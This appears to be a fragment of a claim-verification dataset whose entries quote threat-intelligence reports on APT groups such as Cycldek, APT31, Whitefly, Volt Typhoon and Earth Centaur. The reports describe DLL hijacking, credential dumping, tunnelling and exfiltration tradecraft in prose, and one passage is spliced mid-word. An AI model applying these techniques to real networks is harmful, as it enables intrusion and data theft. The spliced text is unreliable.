following are several notable examples: One of the most notable examples in Cycldek’s toolset that demonstrates both data stealing and lateral movement capabilities is a malware we discovered and dubbed USBCulrpit. This tool, which we saw downloaded by RedCore implants in several instances, is capable of scanning various paths in victim machines, collecting documents with particular extensions and passing them on to USB drives when they are connected to the system. It can also selectively copy itself to a removable drive in the presence of a particular file, suggesting it can be spread laterally by having designated drives infected and the executable in them opened manually. During the time the malware was active, it showed little change in functionality. Based on Kaspersky’s telemetry, USBCulprit has been seen in the wild since 2014, with the latest samples emerging at the end of 2019. The most prominent addition incorporated to samples detected after 2017 is the capability to execute files with a given name from a connected USB. This suggests that the malware can be extended with other modules. However, we were not able to capture any such files and their purpose remains unknown. Another change we saw is the loading scheme used for variants spotted after 2017. The older versions made use of a dropper that wrote a configuration file to disk and extracted an embedded cabinet archive containing a legitimate binary and a malicious side-loaded DLL. This was improved in the newer versions, where an additional stage was added, such that the side-loaded DLL decrypts and loads a third file from the archive containing the malicious payload. As a result, the latter can be found in its decrypted form only in memory. This loading scheme demonstrates that the actor behind it makes use of similar TTPs seen in the previously described implants attributed to Cycldek. For example, binaries mimicking AV components are leveraged for conducting DLL load-order hijacking. In this case, one of the files dropped from the cabinet archive named ‘wrapper.exe’ (originally named ‘PtUserSessionWrapper.exe’ and belonging to Trend Micro) forces the execution of a malicious DLL named ‘TmDbgLog.dll’. Also, the malware makes use of an encrypted blob that is decrypted using RC4 and executed using a custom PE loader. The full chain is depicted in the figure below. The chosen files are then grouped into encrypted RAR archives. To achieve that, the malware extracts a ‘rar.exe’ command line utility, hardcoded as a cabinet archive in its binary, and runs it against every list created in the former step. The password for the archive is initialized at the beginning of the malware’s execution, and is set to ‘abcd!@#$’ for most variants that we observed. It is worth noting that sought documents can be filtered by their modification date. Several variants of USBCulprit perform a check for a file named ‘time’ within the directory from which the malware is executed. This file is expected to have a date-time value that specifies the modification timestamp beyond which files are considered of interest and should be collected. If the ‘time’ file doesn’t exist, it is created with the default value ‘20160601000000’ corresponding to 01/06/2016 00:00:00. When a USB is connected, the malware will verify if stolen data should be exfiltrated to it or it already contains existing data that should be copied locally. To do this, a directory named ‘$Recyc1e.Bin’ will be searched in the drive and if not found, will be created. This directory will be used as the target path for copying files to the drive or source path for obtaining them from it. To understand which direction of file copy should take place, a special marker file named ‘1.txt’ is searched locally. If it exists, the malware would expect to find the aforementioned ‘$Recyc1e.Bin’ directory in the drive with previously stolen document archives and attempt to copy it to the disk. Otherwise, the local archive files will be copied to the same directory from the disk to the drive. The characteristics of the malware can give rise to several assumptions about its purpose and use cases, one of which is to reach and obtain data from air-gapped machines. This would explain the lack of any network communication in the malware, and the use of only removable media as a means of transferring inbound and outbound data. Also, we witnessed some variants issue commands to gather various pieces of host network information. These are logged to a file that is later transferred along with the stolen data to the USB and can help attackers profile whether the machine in which the malware was executed is indeed part of a segregated network. Another explanation is that the malware was handled manually by operators on the ground. As mentioned earlier, there is no evident mechanism for automatically executing USBCulprit from infected media, and yet we saw that the same sample was executed from various drive locations, suggesting it was indeed spread around. This, along with the very specific files that the malware seeks as executable extensions and could not be found as artifacts elsewhere in our investigation, point to a human factor being required to assist deployment of the malware in victim networks.Cycldek is an example of an actor that has broader capability than publicly perceived. While most known descriptions of its activity give the impression of a marginal group with sub-par capabilities, the range of tools and timespan of operations show that the group has an extensive foothold inside the networks of high-profile targets in Southeast Asia. Furthermore, our analysis of the implants affiliated to the group give an insight into its organizational structure. As already stated, the similarities and differences in various traits of these pieces of malware indicate that they likely originated from different arms of a single organization. Perhaps it’s worth noting that we noted multiple points where such entities didn’t work in a well-coordinated manner, for example, infecting machines using the BlueCore implant when they were already infected with RedCore. Lastly, we believe that such attacks will continue in Southeast Asian countries. The use of different tools to reach air-gapped networks in the same countries and attempts to steal data from them have been witnessed in the past. Our analysis shows this type of activity has not ceased – it has merely evolved and changed shape, in terms of malware and actors. We continue to track the actor and report on its activity in our Threat Intelligence Portal.\n\n\n",

        "explain": "A Chinese cyber-espionage group known as APT31 (or Zirconium) has been seen hijacking home routers to form a proxy mesh around its server infrastructure in order to relay and disguise the origins of their attacks. In a security alert published today, the French National Cybersecurity Agency, also known as ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information), published a list of 161 IP addresses that have been hijacked by APT31 in recent attacks against French organizations. The agency said the APT31 attacks started at the beginning of 2021 and are still ongoing. French officials said that APT31's proxy botnet was used to perform both reconnaissance operations against their targets, but also to carry out the attacks themselves. In a series of tweets today, Ben Koehl, a security researcher for the Microsoft Threat Intelligence Center, said APT31 was using this proxy network to make it appear that attacks are coming from the target organization's national IP address space. One of the reasons for this tactic is that some organizations might be blocking incoming traffic from international IP addresses as a security measure. ANSSI officials are now urging companies, both in France and in other countries, to take the 161 IP addresses and see if connections have been detected in network logs this year, which would suggest that an organization might have been the target of an APT31 operation. “Finding one of the IOCs in logs does not mean the entire system has been compromised and further analysis will be required,” the agency said. According to William Thomas, a security researcher at security firm Cyjax, the IP addresses were located all over the world, and not all were located in France. A copy of the APT31 malware implant installed on the hacked routers was also identified on VirusTotal. The operational tactic of using home routers to create proxy meshes to disguise the origin of web attacks is a common tactic these days. In most cases, hacked routers and IoT devices are assembled into botnets, which are then rented to cybercrime groups. These groups use the botnets as giant proxy meshes to relay a wide variety of malicious activity, such as brute-force attacks, vulnerability exploitation, port scanning operations, and traffic carrying stolen data. But while the tactic has been widely used by financially motivated cybercrime groups, it has also been seen as part of the arsenal of nation-state hacking groups since at least April 2018, when Akamai mentioned APT abuse in a report [PDF] on the UPnProxy technique. On another note, APT31 was also one of the two Chinese hacking groups, together with APT40, that the US and its allies accused on Monday of orchestrating a hacking campaign against Microsoft Exchange servers earlier this year. The Record understands that APT31 used proxy meshes made of home routers as a way to scan the internet and then launch and disguise its attacks against Exchange email servers earlier this year; however, the technique was also used for other operations as well.\n\n\n",

        "claim": "Whitefly: Espionage Group has Singapore in Its Sights Group behind the SingHealth breach is also responsible for a string of other attacks in the region",
        "original_label": "true",
        "label": "true",
        "explain": "In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. Whitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts. “#Whitefly, the group behind the SingHealth breach, is also responsible for a string of other attacks in Singapore https://symc.ly/2X1RALf” From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore. To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors. Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it’s highly likely that they are sent to the victim using spear-phishing emails. If opened, the dropper runs a loader known as Trojan.Vcrodat on the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor’s component may be run with elevated privileges. Once executed, Vcrodat loads an encrypted payload on to the victim’s computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. Once the initial computer on the targeted organization’s network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool.Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials. They perform this tactic repeatedly until they gain access to the desired data. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool.Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time. In some attacks, Whitefly has used a second piece of custom malware, Trojan.Nibatad. Like Vcrodat, Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer. And similar to Vcrodat, the Nibatad payload is designed to facilitate information theft from an infected computer. While Vcrodat is delivered via the malicious dropper, we have yet to discover how Nibatad is delivered to the infected computer. Why Whitefly uses these two different loaders in some of its attacks remains unknown. And while we have found both Vcrodat and Nibatad inside individual victim organizations, we have not found any evidence of them being used simultaneously on a single computer. Some of the tools that Whitefly has used in its attacks have also been deployed in other targeted attacks outside Singapore. Between May 2017 and December 2018, a multi-purpose command tool (SHA2: 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9) that has been used by Whitefly was also used in attacks against defense, telecoms, and energy targets in Southeast Asia and Russia. The tool appears to be custom-built and, aside from its use by Whitefly, these were the only other attacks where Symantec has observed its use. In another case, Vcrodat was also used in an attack on a UK-based organization in the hospitality sector. It's possible Whitefly itself performed these attacks but it’s more likely that they were carried out by one or more other groups with access to the same tools. It now appears that the SingHealth breach was not a one-off attack and was instead part of a wider pattern of attacks against organizations in the region. Whitefly is a highly adept group with a large arsenal of tools at its disposal, capable of penetrating targeted organizations and maintaining a long-term presence on their networks. Links with attacks in other regions also present the possibility that it may be part of a broader intelligence gathering operation. Symantec has the following protection in place to protect customers against these attacks:File-based protection,cTrojan.Vcrodat, Trojan.Nibatad, Hacktool.Rootkit, Hacktool.Mimikatz.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "In August of 2018, DarkMatter released a report entitled “In the Trails of WINDSHIFT APT”, which unveiled a threat actor with TTPs very similar to those of Bahamut. Subsequently, two additional articles (here and here) were released by Objective-See which provide an analysis of some validated WINDSHIFT samples targeting OSX systems. Pivoting on specific file attributes and infrastructure indicators, Unit 42 was able to identify and correlate additional attacker activity and can now provide specific details on a targeted WINDSHIFT attack as it unfolded at a Middle Eastern government agency.The following is a summary of observed WINDSHIFT activity which targeted a Middle Eastern government agency:The first attack occurred in early January of 2018 with an inbound WINDTAIL sample (the backdoor family used by WINDSHIFT) originating from the remote IP address 109.235.51[.]110 to a single internal IP address within the government agency. As per the timeline in Figure 2, at the time this event occurred, the IP address 109.235.51[.]110 was associated with the domain flux2key[.]com, a known WINDSHIFT domain. Upon further analysis, Unit 42 determined the sample’s corresponding C2 server IP address was 109.235.51[.]153. At the time this event occurred, that IP was associated with the domain string2me[.]com, which is a known WINDSHIFT domain. While Unit 42 does not have any insight into the attempted infection methodology in this case, the actor’s TTPs would suggest that spearphishing was almost certainly involved. After the initial infection attempt, several additional WINDTAIL samples from the same external IP address, 109.235.51[.]110, were directed at the same internal IP address from January through May of 2018 (see Figure 2 for additional details). All related WINDTAIL samples were Mac OSX app bundles in zip archives, which is consistent with WINDSHIFT TTPS. One sample in particular, named “mcworker.zip” (SHA256: e0fdcb5e0215f9fae485fbfcd615c79b85806827e461bca2e1c00c82e83281dc) deserves particular attention. Upon further analysis, Unit 42 determined its C2 server IP address was 185.25.50[.]189. According to OSINT, at the time of the activity, the IP address 185.25.50[.]189 had one domain resolution: domforworld[.]com.By analyzing this attack in detail, Unit 42 was able to gain valuable insight into the real-world TTPs of a known threat actor group. Of particular importance are the following findings: Unit 42 assesses with high confidence that both the IP address 185.25.50[.]189 and the domain domforworld[.]com is associated with WINDSHIFT activity. Additionally, the IP addresses 109.235.51[.]110 and 109.235.51[.]153, corresponding to the previously validated WINDSHIFT domains flux2key[.]com and string2me[.]com, respectively, were also observed in use during this campaign. The attacker-owned IP address 109.235.50[.]191 was subsequently identified in a Norman Security report from as being associated with Hangover threat actor activity, and both IP addresses 109.235.51[.]110 and 109.235.50[.]191 shared the name “XENEUROPE” within their organizational registrant WHOIS information. This organizational name is tied to a number of IP addresses of Hangover-associated infrastructure as per the Norman report. Collectively, this evidence serves to strengthen the implication from other security researchers that Operation Hangover and WINDSHIFT activity are possibly related. Based on Unit 42’s observations of multiple inbound WINDTAIL samples directed at the same internal IP address, Unit 42 assesses with moderate confidence that the attackers were not able to establish persistence within the targeted environment. While Unit 42 cannot definitively determine the attempted delivery vector of these samples, WINDTAIL TTPs would indicate that it was likely standard spearphishing chicanery. One of two of the Mac OSX developer certificates tied to the WINDTAIL samples shown in DarkMatter’s original presentation, Caren Van (4F9G49SUXB), was also tied to the WINDTAIL samples within this blog. Additionally, a newly identified certificate, warren portman (95RKE2AA8F), was found to be directly affiliated with WINDSHIFT malware.Palo Alto Networks customers are protected from this threat in the following ways: AutoFocus customers can track these samples with the Windshift tag. WildFire detects all files mentioned in this report with malicious verdicts.\n\n\n",

        "claim": "China's Volt Typhoon APT Burrows Deeper Into US Critical Infrastructure,  Volt Typhoon has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands on keyboard activities, and stolen credentials.",
        "original_label": "true",
        "label": "true",
        "explain": "The US military was reckoning with two major cyber concerns over the weekend — one the widespread and still unresolved Chinese campaign known as Volt Typhoon targeting military bases, and the other an insider breach affecting Air Force and FBI communications. Biden administration officials have confirmed that Volt Typhoon's malware is much more endemic than previously thought; responders have found it planted inside numerous networks controlling the communications, power, and water feeding US military bases at home and abroad, according to The New York Times. Also concerning, those same networks also touch run of the mill businesses and individuals as well — and investigators are having a hard time assessing the full footprint of the infestation. Meanwhile, a search warrant obtained by Forbes revealed that the Pentagon is dealing with a wholly separate cyber intrusion — in this case, a communications compromise affecting 17 Air Force facilities, and possibly the FBI as well, courtesy of an Air Force engineer. Chinese Malware a 'Ticking Time Bomb' Inside Critical US Networks The Chinese state-aligned advanced persistent threat (APT) behind Volt Typhoon, aka “Vanguard Panda,” came to attention after Microsoft observed Chinese cyber activity in Guam, the site of a US military base strategically significant to the defense of Taiwan against Chinese aggression. Microsoft posited at the time “that this Volt Typhoon campaign is pursuing development of capabilities that could disrupt critical communications infrastructure between the United States and Asia region during future crises.” That case, disclosed in May, has turned out to be just one small part of a much broader campaign, and the aim towards being in place to carry out destruction now seems increasingly likely as a motivation; sources told the Times that the attackers are in a position to handicap military response and supply chains for materiel should a kinetic conflict kick off. “More than a dozen US officials and industry experts said in interviews over the past two months that the Chinese effort goes far beyond telecommunications systems and predated the May report by at least a year,” the New York Times reported July 29, with one congressman pithily labeling the campaign “a ticking time bomb.” Further, the Times reported that “There is a debate inside the administration over whether the goal of the operation is primarily aimed at disrupting the military, or at civilian life more broadly in the event of a conflict.” Austin Berglas, a former FBI Cyber Division special agent, now global head of professional services at BlueVoyant, isn't surprised that China is buried inside of the US's most critical networks. “We've known that China is looking to exploit any sector it could to give them an advantage politically, socially, or economically. So it's not surprising,” he says. “What is surprising is the mention of destructive malware. That's not normally seen in their typical toolkit.” “When you look at traditional tactics, techniques, and procedures (TTPs) used by Chinese state actors, they're doing espionage,” he explains. Malware designed to disrupt or destroy critical systems changes the story. “Is it positioning them for a retaliatory strike? Is it something that we're going to start seeing more of in the future from these guys?” An Insider Attack Takes Flight at the Air Force Also on July 29, Forbes revealed that the Pentagon ordered a raid on a 48-year-old engineer from the Arnold Air Force base in Tullahoma, Tenn. According to the relevant search warrant, the engineer had taken $90,000 worth of radio equipment home, gaining unauthorized access to radio communications technologies employed by Air Education and Training Command (AETC), a wing of the Air Force responsible for recruitment and training. In the raid, investigators found an open computer running a Motorola radio programming software “which contained the entire Arnold Air Force Base (AAFB) communications system,” the warrant stated, plus evidence of access to privileged communications from the FBI and other Tennessee state agencies. Berglas says that the impact on the other agencies is not surprising. He likens it to his time in the FBI. “If I was sitting at my desk at work, I couldn't put a USB drive into my computer. I couldn't put a disc in to make a copy, or take that media off of the network any other way, aside from printing,” he explains. “The problem is, as an FBI office, you rely heavily on state and local partners. So you need to give them classified access to certain levels of information, depending on the investigation. But when that information gets to that office, those task forces and contractors probably don't have the same level of cyber safeguards in place,” he explains. It's a lesson for any organization: Even those that practice such stringent zero trust as the FBI and Air Force still face the same insider threats, and the same supply chain risks, as any other organization. “When you're looking at securing classified information,” he concludes, “you have to enable those individual and agency partners to comply. It's about giving resources to the weakest link in the chain, and supporting them to be more secure.”\n\n\n",

        "explain": "Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat group that has been active since 2011. In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since. The actors seem to be targeting organizations in the transportation industry and government agencies related to transport. We observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories). Currently, we have not discovered substantial damage to these victims as caused by the threat group. However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data. Through long-term monitoring, we learned that this threat group is proficient at red teamwork. The group knows how to bypass security settings and keep its operation unobstructive. Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently. We expand on these techniques and other capabilities in the following sections. More importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation. It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise. Overview of Earth Centaur’s infection chain Based on our investigation, we found that the intrusion process used by Earth Centaur can be separated into several stages, which are shown in Figure 1. We found that the threat actors used vulnerable Internet Information Services (IIS) server and Exchange server vulnerabilities as entry points, and then installed web shells. Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote administration tool aka Quasar RAT) were deployed on the compromised machine. Then, depending on the victims, the threat actors dropped different types of second-stage backdoors, such as ChiserClient and SmileSvr. After exploiting the victim's environments successfully, the threat actors start Active Directory (AD) discovery and spread their tools via Server Message Block (SMB). Then, they use intranet penetration tools to build the connection between the victim’s intranet and their command-and-control (C&C) servers. We go into further detail about these stages in our analysis. Technical Analysis of Earth Centaur’s Tools and Techniques,After the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin).After our long-term monitoring, we observed that there are two different decryption algorithms (DES or AES) used in Nerapack to decrypt the payload. Moreover, in its newer version, it uses a technique called “Timestomping.” Timestomping is when the timestamp of the payload file (.bin) is altered to make it harder for incident response analysts to find it.The decryption key is used as an argument of Nerapack and various keys are used on different victims. It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools.Fortunately, we were still able to collect the decryption key in some cases and we decrypted the payload successfAfter further analysis, we found that the threat group developed multiple backdoors capable of communication via common network protocols. We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data. We also found that the group tries to launch various backdoors per victim. Furthermore, it also tends to use existing frameworks to make customized backdoors. By using existing frameworks, examples of which are detailed in the following, it builds new backdoor variants more efficiently.ully. Based on our current cases, the decrypted payload is Quasar RAT. After the payload is deployed, the actors can continue further malicious actions through Quasar RAT.After the backdoor is launched, it will decrypt the embedded C&C configuration via AES (CTR mode) algorithm for the following connection. In the configuration, there are three C&C addresses and corresponding port numbers.In the first connection, ChiserClient will append the host name of the compromised host for check-in purposes. Then, it will keep running on the hosts and wait for further commands from the C&C server. ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host.HTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15). Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js. It is used to translate between objects in code and objects representation in MongoDB. We saw in our cases that the HTShell client will be launched as a system service on the compromised machine and that it will connect to a C&C server. HTShell supports importing additional config files. We found that the additional config file is located in %PUBLIC%\\Documents\\sdcsvc.dat, and that the content should be encoded by base64. If no config file is imported, it will connect to the predefined C&C address.HTShell encodes a hard-coded string, “tp===” with custom base64 and embeds the encoded string in the request cookies. If the C&C server receives the request with the special cookie value, it can verify that the request comes from its client applications.The response handler of HTShell will use “`” as delimiter to split the command code and argument for the received command.HTShell currently supports three different backdoor functions,During our investigation into Earth Centaurs activities, we found that it also uses another backdoor called Lilith RAT. We think that this Lilith RAT is a highly modified version of the open-source Lilith RAT. The actors reused part of the codes for command execution, while the C&C protocol is changed to Dropbox HTTPS APIs.In order to launch this RAT, the threat actors use a technique called “Phantom DLL hijacking.” In this technique, the RAT will be disguised as the normal wlbsctrl.dll. While the Windows service “IKEEXT” is starting, the fake wlbsctrl.dll is loaded and executed with high privilege. Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being found by investigators.For the C&C connections, the customized Lilith RAT will first check in to the attacker’s Dropbox and see if the victim host exists. If not, the hostname and IP address will be collected and appended to the existing compromised hosts’ information. All data will then be encrypted and sent back.After the check-in request, the backdoor will start to wait for more commands to come in. All the request data are formatted to JSON, and they are encrypted by AES and encoded by base64.We found that there are two types of SmileSvr. The difference between the two variants is the protocol used for communication: ICMP and SSL. The threat actors will use an installer to install SmileSvr as a system service and drop a DAT file that contains encoded C&C information. In the configuration file, the memory size used for storing C&C address and C&C address will be defined.The ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C address, which is defined in a configuration file. In each SmileSvr, there is an embedded number (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the sent ICMP packet. We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise.Without knowing the real traffic from the C&C server, we can only speculate on the content of the response based on the receiving function. As shown in Figure 11, the content of the response should contain the sequence number used to verify if the received data comes from the correct source and two blocks of encrypted data.First, the encrypted data is decrypted with a one-byte XOR key (0xFF). The first of the decrypted content contains a magic number used to check data in the second block, a command code, and the XOR key to decrypt the second set of encrypted content. The second set of encrypted content is decrypted with an XOR key (0x99) from the previous decrypted content, and within the decrypted data are instructions for the following procedures.While analyzing samples, we found that the C&C server was already inactive. Without knowing the traffic between SmileSvr and C&C server, we could not fully understand all functions. As for the SSL version of SmileSvr, the capability of SSL communication is built by using wolfSSL, which is a lightweight, C-language based SSL/TLS library. The backdoor functions of SSL version SmileSvr are similar to the ICMP ones. The threat actors just use it to develop new ways to support data transfer via an encrypted channel.In our investigation, we also found a suspicious executable named telegram.exe. After analyzing the file, we found that it was a customized version of Gh0st RAT. Compared to the original Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a new function to discover information from active sessions on the host.After successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim’s intranet. In this stage, we also observed attempts to deploy tools to exfiltrate stolen information. During our investigation, we found evidence of specific tools, which we listed in Table 1. With these tools, the attackers accomplish their goals (network discovery, access to the intranet, and exfiltration) step by step.We also observed that the group used multiple legitimate tools to dump credentials on compromised machines. It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive. For example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that creates dumps of the processes in any scenario), which it renamed bootsys.exe.The group dumps credentials stored in registries by using reg.exe.The group would also dump memory from the specified process by using comsvcs.dll.To avoid exposing their footprints to investigators, the threat actors made their own tool to wipe out the event logs on the victimized machine. By using this tool, they could clean specified event logs and make it hard for investigators to track their operations.After successfully exploiting the vulnerable system, threat actors also drop following tools: FRP and Chisel. FRP is a fast reverse proxy used to expose a local server behind an NAT or a firewall to the internet. It can read predefined configurations and make the host in the intranet available to users from the internet.Chisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls. It provides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and allows threat actors to pass through a firewall and get access to the machine behind the firewall.This is used to download reverse proxy Chisel via PowerShell,This is used to build a connection between inter/intranet via Chisel.In the previous phase, we observed that the actors use several tools to get the whole picture of the network infrastructure and bypass the firewall. Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration. It also provides an easy and effective way of copying data to several cloud storage providers.Based on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data. However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.After long-term observation and analysis of the attack campaigns, there was compelling evidence that they were operated by Earth Centaur. We found several identifying features of the threat actors within the techniques and tools described in the preceding sections, and we break down the factors in the following.We found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient. The decoded string is shown in Table 2. Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region.After analyzing the ChiserClient, we found that it shares a similar style of network configuration to the TClient mentioned in our previous research on Earth Centaur.After checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation. Both share similar codes in configuration decoding, which is shown in Figure 14. Furthermore, the delimiter that was used in SmileSvr to split different values in configuration files is the same as the one used in YAHAMAM.These threat actors are notably sophisticated and well-equipped. Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar. For example, the group can map their target’s network infrastructure and bypass firewalls. It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers. In this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries. Information on how a threat enters and operates within a victim’s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations. Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise.

After successful exploitation of the system, Tropic Trooper also attempts to breach the intranet, dump credentials, and wipe out event logs from the infected machines using a specific set of tools. Earth Centaur, also known by the monikers Pirate Panda and Tropic Trooper, is a long-running threat group focused on information theft and espionage that has led targeted campaigns against government, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong dating all the way back to 2011.The hostile agents, believed to be a Chinese-speaking actor, are known for their use of spear-phishing emails with weaponized attachments to exploit known vulnerabilities, while simultaneously advancing their malicious tools with obfuscation, stealthiness, and striking power. The findings are noteworthy because of the steps the advanced persistent threat (APT) takes to avoid detection and the critical nature of the targeted entities, not to mention the new capabilities developed for their malicious software to linger on infected hosts and avoid detection. The transportation industry and government agencies related to the sector are the victims of an ongoing campaign since July 2020 by a sophisticated and well-equipped cyberespionage group in what appears to be yet another uptick in malicious activities that are \"just the tip of the iceberg.\" The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently.",

Further analysis of the traffic between known Volt Typhoon infrastructure and likely compromised devices led SecurityScorecard to the conclusion that the APT may operate a much more extensive botnet than previously believed. Given that this compromised device is in New Caledonia, the cybersecurity firm believes that it serves as a transit point for Volt Typhoon-related traffic. Specifically, over a 37-day period, 325 out of 1,116 devices were seen connecting to two IP addresses used as proxy routers for command-and-control (C&C) communication, suggesting that they might be part of the same Volt Typhoon-linked botnet of compromised devices. “The available analysis of Volt Typhoon has highlighted its targeting of communications between APAC and the Americas – its intrusions into the networks of telecommunications providers and other critical infrastructure in Guam attracted particular attention in previous reporting–so its exploitation of telecommunications infrastructure on another Pacific island may be in keeping with this previous behavior,” the cybersecurity firm says. “While public reporting on Volt Typhoon has not previously noted its targeting of Australian or UK government assets in addition to US ones, such activity would be in keeping with PRC nation-state cyber activity more generally, as these countries’ roles in the Western alliance system (including their Five Eyes and AUKUS membership) have contributed to their frequent targeting by China-linked APT group,” SecurityScorecard says.",

Comprehensive forensic research of the infected systems revealed a strong connection to a threat actor we call ‘Lebanese Cedar’, ‘Lebanese Cedar’ APT has been operating since 2012. These operations were first discovered by Check-Point researchers and Kaspersky labs in 2015. Since 2015 Lebanese Cedar APT – also referred to as “Volatile Cedar” – maintained a low profile and operated under the radar. Read the full report: “Lebanese Cedar” APT – Global Lebanese Espionage Campaign Leveraging Web Servers In the comprehensive forensic research, a new version of the “Explosive” V4 RAT (Remote Access Tool) or “Caterpillar” V2 WebShell was found within the victim’s networks.Based on a modified JSP file browser with a unique string that the adversary used to deploy ‘Explosive RAT’ into the victims’ network, we found some 250 servers that were apparently breached by Lebanese Cedar. This file was installed in vulnerable Atlassian (JIRA) and Oracle 10g servers. In order to install the JSP in the vulnerable server, Lebanese Cedar exploit 1-day publicly known vulnerabilities such as CVE-2012-3152. Our report reveals a partial list of the companies that the group has attacked. The target companies are from many countries including: The United States, the United Kingdom, Egypt, Jordan, Lebanon, Israel, and the Palestinian Authority. We assess that there are many more companies that have been hacked and that valuable information was stolen from these companies over periods of months and years.According to Check-Point’s report, the group is motivated by political and Ideological interests, targeting individuals, companies, and institutions worldwide. We endorse Check Point’s strong case attributing Lebanese Cedar APT to the Lebanese government or a political group in Lebanon. Moreover, there are several indications that link Lebanese Cedar APT to the Hezbollah Cyber Unit. “Caterpillar WebShell” was found in most of the victims we investigated, in many of the systems we also found traces of “Explosive” RAT. We identified the specific open-source JSP file browser that was modified for the hackers’ purposes. We found that Lebanese Cedar deployed the payload of Explosive RAT into the victims’ network. Lebanese Cedar is the only known threat actor that uses this code.\n\n\n",

